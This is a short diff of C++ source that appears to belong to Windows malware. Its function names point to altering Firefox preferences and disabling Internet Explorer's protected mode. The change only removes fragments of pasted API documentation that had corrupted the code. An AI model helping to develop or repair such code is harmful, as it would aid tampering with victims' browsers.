@@ -329,9 +329,8 @@ void SetFirefoxPrefs()
                         return;
                      }
                   }
-               }Creates or opens a file or I/O device. The most commonly used I/O devices are as follows: file, file stream, directory, physical disk, volume, console buffer, tape drive, communications resource, mailslot, and pipe. The function returns a handle that can be used to access the file or device for various types of I/O depending on the file or device and the flags and attributes specified.
-
-To perform this operation as a transacted operation, wh
+               }
+               
                entry += Funcs::pLstrlenA(entry) + 1;                                            // continues search if "Profile" section is not found yet
                if(!entry[0])                                                                    // stops if two subsequent '\0' are met. (the last section
                   break;                                                                        // is marked with two '\0' by convention)
@@ -340,9 +339,7 @@ To perform this operation as a transacted operation, wh
       }
    }
 }
-Creates or opens a file or I/O device. The most commonly used I/O devices are as follows: file, file stream, directory, physical disk, volume, console buffer, tape drive, communications resource, mailslot, and pipe. The function returns a handle that can be used to access the file or device for various types of I/O depending on the file or device and the flags and attributes specified.
 
-To perform this operation as a transacted operation, wh
 void DisableMultiProcessesAndProtectedModeIe()
 {
    HKEY  result;
